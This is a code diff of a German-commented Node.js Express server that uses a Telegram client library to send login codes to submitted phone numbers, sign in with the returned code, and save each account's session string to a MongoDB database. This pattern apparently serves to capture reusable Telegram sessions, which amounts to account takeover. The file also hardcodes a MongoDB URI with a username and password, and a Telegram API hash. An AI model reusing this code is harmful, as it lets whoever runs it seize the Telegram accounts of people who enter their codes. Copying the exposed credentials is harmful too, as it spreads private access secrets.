@@ -13,40 +13,41 @@ const apiHash = 'e9c00af578a9de0253ef02337460498f';
 const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';
 
 mongoose.connect(MONGO_URI).catch(console.error);
+const SessionModel = mongoose.model('Session', new mongoose.Schema({ phone: String, session: String }));
 
-const SessionSchema = new mongoose.Schema({ phone: String, session: String });
-const SessionModel = mongoose.model('Session', SessionSchema);
-
-// Memory Storage mit Cleanup
 const activeClients = new Map();
 
 app.post('/send-code', async (req, res) => {
     try {
         const { phone } = req.body;
-        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+        // StringSession muss leer sein für den neuen Login-Flow
+        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 10 });
         await client.connect();
         
         const result = await client.sendCode({ apiId, apiHash }, phone);
         
-        // Speichere Client und Hash. Lösche nach 5 Min bei Inaktivität
+        // Speichere Client-Instanz und Hash
         activeClients.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
-        setTimeout(() => activeClients.delete(phone), 300000);
         
-        res.json({ success: true });
+        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
     } catch (error) {
+        console.error("SendCode Error:", error);
         res.status(400).json({ error: error.message });
     }
 });
 
 app.post('/verify-code', async (req, res) => {
     try {
-        const { phone, code } = req.body;
+        const { phone, code, phoneCodeHash } = req.body;
         const sessionData = activeClients.get(phone);
 
-        if (!sessionData) return res.status(400).json({ error: "Session abgelaufen." });
+        if (!sessionData) {
+            return res.status(400).json({ error: "Keine aktive Sitzung. Bitte neu starten." });
+        }
 
-        const { client, phoneCodeHash } = sessionData;
+        const { client } = sessionData;
 
+        // Versuche das Signing
         await client.signIn({
             apiId,
             apiHash,
@@ -55,12 +56,14 @@ app.post('/verify-code', async (req, res) => {
             phoneCodeHash: phoneCodeHash
         });
 
+        // Speichere die Session, wenn SignIn erfolgreich
         const stringSession = client.session.save();
         await SessionModel.create({ phone, session: stringSession });
         
-        activeClients.delete(phone);
+        activeClients.delete(phone); // Sauber machen
         res.json({ success: true });
     } catch (error) {
+        console.error("Verify Error:", error);
         res.status(400).json({ error: error.message });
     }
 });
